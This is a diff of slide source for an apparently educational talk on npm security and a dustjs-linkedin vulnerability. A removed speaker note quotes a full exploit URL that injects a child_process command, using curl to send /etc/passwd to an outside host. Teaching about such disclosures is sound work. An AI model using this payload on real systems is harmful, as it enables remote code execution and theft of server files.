@@ -66,14 +66,14 @@ class: text-center
 ```js
 $ npm audit [package]
 
-audited 4 packages in 1s
-found 3141527818921 vulnerabilities
+audited 4 packages
+found 3,141,527,818,921 vulnerabilities
 ```
 
   </div>
 </div>
 
-<ArrowDraw color='yellow' class="absolute top-71 left-103 rotate-20" width="80px" />
+<ArrowDraw color='yellow' class="absolute top-72 left-103 rotate-20" width="80px" />
 
 
 <div class="ml-8">
@@ -161,31 +161,12 @@ Can you spot the issue?
 <div class="mt-12">
 </div>
 
-<v-click>
-
   - Found in `dustjs-linkedin`
   - Downloaded 100,000 / month
   - Let's appreciate that this was found as a blackbox test
 
   ![dustjs-linkedin npm package downloads](./images/dustjs-linkedin-npm-downloads.png)
 
-</v-click>
-
----
-
-# A vulnerability report that paid $10k in bug bounty
-
-![dustjs-linkedin bug bounty demo](./images/dustjs-linkedin-bug-bounty-demo.png)
-
-<!-- 
-
-"just a small typing issue"
-
-that's pocketing a pay-out of $10,000 for a string of text 😉
-
-can finish the presentation with the string payload to keep the dramatic effect:
-https://_demo.paypal.com/demo/navigation?device[]=x&device[]=y'-require('child_process').exec('curl+-F+"x=`cat+/etc/passwd`"+artsploit.com')-'
--->
 
 ---
 layout: center
